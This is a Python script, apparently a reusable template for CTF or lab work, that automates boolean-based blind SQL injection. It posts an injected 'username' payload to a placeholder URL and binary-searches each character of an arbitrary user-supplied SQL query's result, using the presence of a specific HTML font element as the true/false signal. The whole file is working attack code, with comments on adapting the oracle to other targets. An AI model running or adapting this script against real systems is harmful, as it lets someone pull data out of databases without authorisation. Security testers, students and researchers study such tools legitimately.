import sys
import requests
from bs4 import BeautifulSoup

url = "url_field"
cookie = {
    "some_cookie": "some_cookie_field"
}
proxy = {
    #You can use some proxy
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def binary_search(start, end, num, query):
    while start <= end:
        mid = (start + end) // 2
        data = {
            "username": f"0' OR '{mid}' <= ASCII(substr(({query}),{num},1));-- +"
        }
        response = requests.post(url, data, cookies=cookie, proxies=proxy)
        soup = BeautifulSoup(response.text, "html.parser")

        #YOU SHOULD CHANGE THIS FIELD!
        #The binary search is based on some type of response receiving.
        #At this example it search and check if the following element exist:
        #<font size="5" color="#00AA00">
        if soup.find("font", {"size": "5", "color": "#00AA00"}):
            #for debugging:
            #print("true")
            start = mid + 1
        else: 
            #for debugging:
            #print("false")
            end = mid - 1
    return end

query = input().strip() 
print(f"your query is: {query}")
num = 1
while True:
    end = binary_search(0, 128, num, query)
    if (end == 0 or end == 128):
        print("Done")
        break
    else:
        try:
            print(chr(end), end="")
        except:
            print(end, end="")
        sys.stdout.flush()
        num += 1
        